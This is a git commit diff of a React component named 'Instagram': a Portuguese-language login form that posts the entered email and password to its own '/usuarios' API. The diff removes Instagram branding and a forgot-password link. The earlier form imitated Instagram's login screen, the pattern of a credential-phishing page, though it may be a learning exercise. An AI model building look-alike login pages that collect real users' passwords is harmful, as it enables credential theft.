94f6799d646f49afe8ac2e23050327c2e70303dc
geibriel12 <marquezzd4@gmail.com>
2026-01-05 01:28:09 -0300

    hgh

--- index.jsx
+++ index.jsx
@@ -13,6 +13,7 @@ function Instagram() {
     }
 
     try {
+      // O axios usará a baseURL configurada no api.js + '/usuarios'
       await api.post('/usuarios', {
         email: inputEmail.current.value,
         senha: inputSenha.current.value
@@ -20,38 +21,19 @@ function Instagram() {
 
       inputEmail.current.value = ""
       inputSenha.current.value = ""
-
       alert("Dados enviados com sucesso!")
     } catch (error) {
       console.error("Erro na requisição:", error)
-      alert("Erro ao enviar dados para o servidor.")
+      alert("Erro ao enviar dados. Verifique o console.")
     }
   }
 
   return (
     <div className='container'>
       <form onSubmit={(e) => { e.preventDefault(); createUsers(); }}>
-        <div className="logo-container">
-          <i className="fab fa-instagram instagram-icon"></i>
-        </div>
-
-        <input 
-          placeholder="E-mail ou nome de usuário" 
-          ref={inputEmail} 
-          type="email" 
-          required 
-        />
-        
-        <input 
-          placeholder="Senha" 
-          ref={inputSenha} 
-          type="password" 
-          required 
-        />
-        
+        <input placeholder="E-mail" ref={inputEmail} type="email" required />
+        <input placeholder="Senha" ref={inputSenha} type="password" required />
         <button type='submit'>Entrar</button>
-
-        <a href="#" className="forgot-password">Esqueceu a senha?</a>
       </form>
     </div>
   )
